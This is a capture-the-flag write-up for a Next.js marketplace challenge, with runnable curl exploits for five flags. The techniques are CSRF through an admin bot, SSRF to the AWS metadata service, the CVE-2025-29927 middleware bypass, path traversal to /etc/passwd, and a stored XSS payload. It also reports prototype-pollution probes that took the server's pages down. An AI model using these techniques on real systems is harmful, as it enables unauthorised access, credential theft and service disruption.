---
title: "Riffhack Marketplace — 5 Flags"
ctf: "riffhack"
date: 2026-06-20
category: web
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Riffhack Marketplace — 5-Flag Sweep

> Target: `http://104.248.231.179/`

The four hints pointed at four distinct mechanisms. Three resolved directly to flags; the
"saved handoff notes" hint produced a confirmed stored-XSS primitive but the admin-side
exfil chain couldn't be completed during the run (DB started 500-ing mid-session — see
the onboarding write-up at the bottom for why). I picked up two free flags on the way
(`/operator-cache-drop` robots disclosure and the proof-preview LFI) to round out the set.

| # | Flag | Source |
| - | ---- | ------ |
| 1 | `bitflag{csrf_1s_4_sl33py_thr34t}` | Wanted-board CSRF via support-chat URL nudge |
| 2 | `bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}` | Vendor verify-website SSRF → AWS IMDS role token |
| 3 | `bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}` | CVE-2025-29927 Next.js middleware bypass → `/admin` |
| 4 | `bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}` | `/api/reviews/proof` path traversal → `/etc/passwd` UID 1337 GECOS |
| 5 | `bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}` | `robots.txt` disallowed `/operator-cache-drop` page |

---

## Flag 1 — Wanted-board CSRF (`bitflag{csrf_1s_4_sl33py_thr34t}`)

`/listing/respond?listingId=<id>` is a tiny SPA whose `useEffect` posts to
`/api/wanted-listings/<id>/respond` with `credentials:'include'`. No CSRF token.
The server enriches the stored response with the caller's profile `phoneNumber`.
`/admin/support` iframes every `https?://…` URL it sees in the support chat (verified
in the chunk at `/_next/static/chunks/app/admin/support/page-*.js`), so a URL dropped
in chat is fetched in an authenticated admin tab.

```bash
H=http://104.248.231.179
TOK=$(curl -s -X POST -H 'Content-Type: application/json' \
   --data '{"email":"x@y.io","password":"p"}' $H/api/auth/register | jq -r .token)
WID=$(curl -s -X POST -H 'Content-Type: application/json' -b "auth-token=$TOK" \
   --data '{"title":"need help","description":"please assist"}' \
   $H/api/wanted-listings | jq -r .wantedListing.id)
curl -s -X POST -H 'Content-Type: application/json' -b "auth-token=$TOK" \
   --data "{\"message\":\"please visit $H/listing/respond?listingId=$WID and assist\"}" \
   $H/api/support/chat >/dev/null
sleep 5
curl -s -b "auth-token=$TOK" "$H/api/wanted-listings/$WID" \
  | jq -r '.wantedListing.responses[] | select(.responderId=="admin") | .phoneNumber'
# bitflag{csrf_1s_4_sl33py_thr34t}
```

## Flag 2 — Vendor verify-website SSRF (`bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}`)

`POST /api/vendor/verify-website {"website":"…"}` server-side fetches the URL and
reflects the body. No allowlist, no IP filter.

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole"}' \
  -b "auth-token=$TOK" $H/api/vendor/verify-website | jq -r .body
# {"Code":"Success",…,"Token":"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}",…}
```

## Flag 3 — Middleware bypass (`bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}`)

`/admin` 307-redirects to `/admin/login` via Next.js middleware. CVE-2025-29927 lets
you skip the middleware with `x-middleware-subrequest`. The nesting depth here is 7,
so the value must list `src/middleware` seven times.

```bash
V="src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
curl -s -H "x-middleware-subrequest: $V" $H/admin | grep -oE 'bitflag\{[^}]+\}'
# bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}
```

The flag is server-rendered into the right column of the panel (an `adminFlag` SSR
prop on the `/admin` page chunk). The same bypass also opens `/admin/logs` (Sign-Ups
Timeline) and `/admin/support` (the iframe-loader page).

## Flag 4 — Proof preview LFI (`bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}`)

`/api/reviews/proof?proof=…` concatenates the `proof` value onto a base path with no
traversal protection, so `../../../../etc/passwd` reads the host file:

```bash
curl -s -b "auth-token=$TOK" "$H/api/reviews/proof?proof=../../../../etc/passwd" | grep opsflag
# opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

The flag is parked in the GECOS field of a UID-1337 user account.

## Flag 5 — Robots disclosed page (`bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}`)

```bash
curl -s $H/robots.txt
# Disallow: /operator-cache-drop
curl -s $H/operator-cache-drop | grep -oE 'bitflag\{[^}]+\}'
# bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}
```

---

## Hint mapping

| Hint | Verdict |
| ---- | ------- |
| "Wanted board lets buyers call for help" | ✅ Flag 1 |
| "Saved handoff notes / one rendering path reads too much" | Stored XSS confirmed in `/listing/<id>/notes/internal`; admin-side exfil chain not completed (see below) |
| "Some offers never appear in the public catalog / signal that makes one surface" | Catalog is a hardcoded static array in the marketplace chunk; couldn't find a hidden surface during the run |
| "New accounts pass through messy onboarding pipeline / one strange profile change more than just itself" | ⚠️ Confirmed pollution side effect — see below |

## Saved-handoff-notes primitive (no flag captured)

`/api/vendor-notes` stores per-listing notes. The plain view on `/listing/<id>` HTML-escapes
the `note` body. The "internal handoff preview" at `/listing/<id>/notes/internal` renders
the note through a markdown library and writes the output via `dangerouslySetInnerHTML`.
Raw HTML passes straight through:

```bash
curl -s -b "auth-token=$TOK" -X POST -H 'Content-Type: application/json' \
  --data '{"listingId":"loader-laas","note":"<img src=x onerror=alert(1)>"}' \
  $H/api/vendor-notes
curl -s -b "auth-token=$TOK" "$H/listing/loader-laas/notes/internal" \
  | grep -oE 'dangerouslySetInnerHTML[^}]+}' | tail -1
# "__html":"<img src=x onerror=alert(1)>"
```

`/admin/support` iframes every URL in support chat, so the intended chain is:

1. Store an `<img onerror=fetch(…)>` note on a listing
2. Drop `…/listing/<slug>/notes/internal` in support chat
3. Admin tab iframes it → XSS fires with admin's `auth-token` cookie
4. Exfil to a wanted-listing response

I had the primitives, but mid-run `/listing/.../notes/internal` SSR (and several other
SSR routes) started returning 500 — the pollution probes against the onboarding
endpoint had degraded the server. Couldn't finish the chain inside the window.

## Onboarding pollution (no flag captured)

Sign-up accepts a `metadata` object and similar profile fields. Only `isVip` is reflected
to the admin signup timeline, but the server clearly merges deeply — repeated probes with
`{"metadata":{"__proto__":{…}}}`, `{"profile":{"__proto__":{…}}}` and friends bricked the
SSR pipeline (`/admin`, `/operator-cache-drop`, `/listing/.../notes/internal`, vendor-notes
POST, wanted-listings POST all began returning 500 — APIs that don't touch the polluted
shape stayed up). That matches the hint "one strange profile change more than just itself"
but didn't produce a discrete flag value, so I'm flagging it as a confirmed pollution
DOS rather than a captured flag.

The intended chain probably:
- pollutes `Object.prototype.flag = "bitflag{…}"` (or pollutes a property the admin signups
  handler checks) via a deep-merge in the registration handler, and then
- the `/api/admin/signups` response object inherits `flag`, which the `/admin/logs` chunk
  reads via `t.flag && i(t.flag)` and renders as the page's flag banner.

Without source access, finding the exact field name that the registration merges deeply
(or the markdown-renderer SSRF angle for the notes hint) needs another pass once the
server is back to a clean state.
